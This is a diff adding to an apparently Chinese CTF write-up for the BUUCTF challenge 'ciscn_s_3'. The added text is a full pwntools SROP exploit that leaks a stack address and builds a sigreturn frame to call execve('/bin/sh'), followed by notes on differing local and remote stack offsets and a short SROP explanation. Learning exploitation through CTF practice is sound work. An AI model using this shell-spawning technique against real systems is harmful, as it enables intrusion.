@@ -44,4 +44,41 @@ io.interactive()
 还有一个 SROP 解法。
 
 ```python
+from pwn import *
+from sys import argv
 
+proc = "ciscn_s_3"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("node5.buuoj.cn", 26165) if argv[1] == 'r' else process(proc)
+
+if args.G:
+gdb.attach(io)
+
+vuln_addr = 0x4004ed
+
+payload1 = b"a" * 16 + p64(vuln_addr)
+# input()
+io.send(payload1)
+io.recv(0x20)
+buf_addr = u64(io.recv(8)) - 0x148
+log.info(f"buf_addr => {hex(buf_addr)}")
+
+syscall_addr = 0x0000000000400501
+sigreturn_addr = 0x4004da
+frame = SigreturnFrame()
+frame.rax = 0x3b
+frame.rip = syscall_addr
+frame.rsi = 0
+frame.rdi = buf_addr
+frame.rdx = 0
+
+payload2 = b"/bin/sh\x00aaaabbbb" + p64(sigreturn_addr) + p64(syscall_addr) + bytes(frame)
+io.sendline(payload2)
+io.interactive()
+```
+
+调这道题目时遇到了本地通远程不同的问题，后来发现是本地和远程的栈的相对偏移不一样，这应该是系统版本问题（我本机是 ubuntu2204，远程是 ubuntu1804），打比赛的时候还是应该在手里多备一些 docker 镜像，也许用 docker-compose 批量管理会更好一点（？
+
+**关于SROP**：只需要把 ROP 链改成 signreturn syscall，然后布置栈就好了。 
